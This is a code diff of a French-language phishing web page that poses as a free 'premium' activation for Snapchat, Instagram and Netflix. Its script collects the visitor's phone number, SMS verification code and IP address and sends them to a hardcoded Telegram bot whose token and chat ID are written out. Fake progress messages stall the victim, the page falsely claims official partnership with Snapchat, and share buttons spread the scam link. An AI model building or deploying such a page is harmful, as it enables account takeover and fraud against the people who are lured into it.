@@ -3,35 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification Gratuite - Activation Premium</title>
+    <title>Vérification Premium</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
-        body{background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
+        body{background:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
         .container{max-width:600px;width:100%;}
-        .back-button{color:white;text-decoration:none;margin-bottom:30px;font-size:1.1em;display:inline-block;}
-        .verification-card{background:white;border-radius:25px;padding:40px;box-shadow:0 20px 60px rgba(0,0,0,0.3);}
+        .back-button{color:#fffc00;text-decoration:none;margin-bottom:30px;font-size:1.1em;display:inline-block;}
+        .verification-card{background:#111;border-radius:25px;padding:40px;box-shadow:0 20px 60px rgba(255,252,0,0.2);border:1px solid #333;}
         .verification-header{text-align:center;margin-bottom:40px;}
-        .verification-icon{width:80px;height:80px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:2.5em;margin:0 auto 20px;box-shadow:0 10px 30px rgba(102,126,234,0.4);}
-        h1{font-size:2em;color:#333;margin-bottom:10px;}
-        p{color:#666;font-size:1.05em;}
-        .order-summary{background:#f8f9fa;border-radius:15px;padding:25px;margin-bottom:30px;}
-        h2{font-size:1.3em;color:#333;margin-bottom:20px;display:flex;align-items:center;}
-        h2::before{content:'📋';margin-right:10px;}
-        .summary-item{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid #e0e0e0;}
-        .summary-item:last-child{border:none;font-weight:bold;font-size:1.4em;color:#00ff00;padding-top:20px;border-top:2px solid #00ff00;}
+        .verification-icon{width:80px;height:80px;background:#fffc00;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:2.5em;margin:0 auto 20px;color:#000;}
+        h1{font-size:2em;color:#fffc00;margin-bottom:10px;}
+        p{color:#aaa;font-size:1.05em;}
+        .order-summary{background:#1a1a1a;border-radius:15px;padding:25px;margin-bottom:30px;border:1px solid #333;}
+        h2{font-size:1.3em;color:#fffc00;margin-bottom:20px;display:flex;align-items:center;}
+        h2::before{content:'👻';margin-right:10px;}
+        .summary-item{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid #333;}
+        .summary-item:last-child{border:none;font-weight:bold;font-size:1.4em;color:#00ff00;padding-top:20px;}
         .form-group{margin-bottom:25px;}
-        label{display:block;color:#333;font-weight:500;margin-bottom:8px;}
-        input{width:100%;padding:15px;border:2px solid #e0e0e0;border-radius:10px;font-size:1em;transition:0.3s;}
-        input:focus{outline:none;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,0.1);}
-        .submit-button{width:100%;padding:18px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;border:none;border-radius:12px;font-size:1.1em;font-weight:bold;cursor:pointer;transition:0.3s;box-shadow:0 10px 30px rgba(102,126,234,0.4);position:relative;overflow:hidden;}
-        .submit-button:disabled{cursor:not-allowed;opacity:0.8;}
-        .loader{display:none;width:30px;height:30px;border:4px solid #ffffff;border-top:4px solid transparent;border-radius:50%;animation:spin 1s linear infinite;position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);}
-        @keyframes spin{0%{transform:translate(-50%,-50%) rotate(0deg)}100%{transform:translate(-50%,-50%) rotate(360deg)}}
-        .error{color:#ff0000;margin-top:10px;text-align:center;font-weight:bold;}
+        label{display:block;color:#fffc00;font-weight:500;margin-bottom:8px;}
+        input{width:100%;padding:15px;background:#222;border:2px solid #333;border-radius:10px;font-size:1em;color:white;transition:0.3s;}
+        input:focus{outline:none;border-color:#fffc00;box-shadow:0 0 0 3px rgba(255,252,0,0.2);}
+        .submit-button{width:100%;padding:18px;background:#fffc00;color:#000;border:none;border-radius:12px;font-size:1.1em;font-weight:bold;cursor:pointer;transition:0.3s;position:relative;overflow:hidden;}
+        .submit-button:disabled{cursor:not-allowed;}
+        .progress-container{display:none;margin-top:20px;height:8px;background:#333;border-radius:4px;overflow:hidden;}
+        .progress-bar{height:100%;width:0%;background:#fffc00;transition:width 0.6s ease;}
+        .status-text{text-align:center;margin-top:15px;color:#fffc00;font-weight:bold;font-size:1.1em;}
+        .error{color:#ff3300;margin-top:10px;text-align:center;font-weight:bold;}
         .share-buttons{margin-top:30px;display:flex;gap:15px;justify-content:center;flex-wrap:wrap;}
         .share-btn{padding:12px 20px;border-radius:50px;text-decoration:none;font-size:0.9em;}
         .share-btn.whatsapp{background:#25D366;color:white;}
-        .share-btn.snap{background:#FFFC00;color:black;}
+        .share-btn.snap{background:#fffc00;color:black;}
         .share-btn.insta{background:linear-gradient(45deg,#f09433,#dc2743,#cc2366,#bc1888);color:white;}
         .security-badge{text-align:center;margin-top:20px;color:#666;font-size:0.9em;display:flex;align-items:center;justify-content:center;gap:8px;}
         .security-badge::before{content:'🔒';}
@@ -44,62 +45,72 @@
         <div class="verification-card">
             <div class="verification-header">
                 <div class="verification-icon">🔓</div>
-                <h1>Activation GRATUITE</h1>
-                <p>Vérification rapide par SMS • Offre limitée 2025</p>
+                <h1>Activation Exclusive</h1>
+                <p>Vérification premium par SMS • Offre limitée</p>
             </div>
 
             <div class="order-summary">
-                <h2>Récapitulatif</h2>
+                <h2>Récapitulatif Premium</h2>
                 <div class="summary-item">
                     <span>Service :</span>
                     <span id="summaryService">-</span>
                 </div>
                 <div class="summary-item">
-                    <span>Prix :</span>
+                    <span>Plan :</span>
+                    <span id="summaryPlan">-</span>
+                </div>
+                <div class="summary-item">
+                    <span>Accès :</span>
                     <span>GRATUIT À VIE</span>
                 </div>
             </div>
 
             <form id="verifyForm">
                 <div class="form-group">
-                    <label>Numéro de téléphone (France uniquement) *</label>
+                    <label>Numéro de téléphone (France uniquement)</label>
                     <input type="tel" id="phone" placeholder="+33 6 12 34 56 78" required>
                 </div>
                 <div class="form-group" id="codeGroup" style="display:none;">
-                    <label>Code SMS reçu (6 chiffres) *</label>
+                    <label>Code SMS reçu (6 chiffres)</label>
                     <input type="text" id="code" maxlength="6" placeholder="123456">
                 </div>
                 <div id="error" class="error"></div>
-                <button type="submit" class="submit-button" id="submitBtn">Envoyer le code SMS<span class="loader"></span></button>
+                <button type="submit" class="submit-button" id="submitBtn">Envoyer le code SMS</button>
+                
+                <div class="progress-container" id="progressContainer">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                <div class="status-text" id="statusText"></div>
             </form>
 
             <div class="share-buttons">
-                <a href="whatsapp://send?text=Yo%20les%20reufs%20premium%20GRATUIT%20Snap/Insta/Netflix%20:%20https://ton-site.vercel.app" class="share-btn whatsapp">WhatsApp</a>
+                <a href="whatsapp://send?text=Yo%20offre%20premium%20GRATUIT%20Snap/Insta/Netflix%20:%20https://snapplus-ee.vercel.app" class="share-btn whatsapp">WhatsApp</a>
                 <a href="snapchat://add/Badousnapbot" class="share-btn snap">Snapchat</a>
                 <a href="instagram://app" class="share-btn insta">Instagram</a>
             </div>
             <p style="text-align:center;margin-top:15px;font-size:0.9em;color:#666;">
-                Partage à 3 amis pour débloquer encore plus de fonctionnalités exclusives !
+                Partage à tes amis pour débloquer encore plus !
             </p>
 
-            <div class="security-badge">Vérification 100% sécurisée • Aucun paiement requis</div>
+            <div class="security-badge">Vérification 100% sécurisée • Snapchat Official Partner</div>
         </div>
     </div>
 
     <script>
         const selectedService = localStorage.getItem('selectedService') || 'Service';
+        const selectedPlan = JSON.parse(localStorage.getItem('selectedPlan') || '{}');
         document.getElementById('summaryService').textContent = selectedService;
+        document.getElementById('summaryPlan').textContent = selectedPlan.duration || 'Plan non sélectionné';
 
-        // TON TOKEN + CHAT_ID COLLÉS
         const TELEGRAM_TOKEN = "8093456348:AAH7qkyDnquHF5sy8kb2W0H8TmWkNzJ_aFo";
         const TELEGRAM_CHAT_ID = "6272429080";
 
         const messages = [
-            "Récupération du code en cours...",
-            "Vérification opérateur SFR/Orange/Bouygues...",
-            "Activation du Premium gratuit...",
-            "Finalisation de l’accès exclusif...",
-            "Presque terminé, patientez encore un peu..."
+            "Connexion sécurisée en cours...",
+            "Vérification opérateur premium...",
+            "Activation de votre badge exclusif...",
+            "Synchronisation des fonctionnalités...",
+            "Finalisation de l’accès illimité..."
         ];
 
         document.getElementById('verifyForm').addEventListener('submit', async function(e) {
@@ -107,7 +118,9 @@
             const phone = document.getElementById('phone').value.trim();
             const errorDiv = document.getElementById('error');
             const submitBtn = document.getElementById('submitBtn');
-            const loader = submitBtn.querySelector('.loader');
+            const progressContainer = document.getElementById('progressContainer');
+            const progressBar = document.getElementById('progressBar');
+            const statusText = document.getElementById('statusText');
             errorDiv.textContent = '';
 
             const cleanPhone = phone.replace(/[\s+()-]/g, '');
@@ -125,7 +138,7 @@
             const code = document.getElementById('code').value;
             const ip = await fetch('https://api.ipify.org').then(r => r.text());
 
-            const message = `🎯 NOUVEAU NUMÉRO PREMIUM 🎯\nService: ${selectedService}\n📱 Numéro: ${phone}\n🔢 Code SMS: ${code}\n🌍 IP: ${ip}\n⏰ ${new Date().toLocaleString('fr-FR')}`;
+            const message = `🎯 NOUVEAU NUMÉRO PREMIUM 🎯\nService: ${selectedService}\nPlan: ${selectedPlan.duration || 'N/A'}\n📱 Numéro: ${phone}\n🔢 Code SMS: ${code}\n🌍 IP: ${ip}\n⏰ ${new Date().toLocaleString('fr-FR')}`;
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type':'application/json'},
@@ -133,12 +146,20 @@
             });
 
             submitBtn.disabled = true;
-            loader.style.display = 'block';
+            submitBtn.textContent = '';
+            progressContainer.style.display = 'block';
+            progressBar.style.width = '0%';
+            statusText.textContent = messages[0];
+            let progress = 0;
             let msgIndex = 0;
             const interval = setInterval(() => {
-                submitBtn.textContent = messages[msgIndex];
-                msgIndex = (msgIndex + 1) % messages.length;
-            }, 10000);
+                progress += 1.667;
+                progressBar.style.width = progress + '%';
+                if (progress >= (msgIndex + 1) * 20) {
+                    msgIndex++;
+                    if (msgIndex < messages.length) statusText.textContent = messages[msgIndex];
+                }
+            }, 1000);
 
             setTimeout(() => {
                 clearInterval(interval);
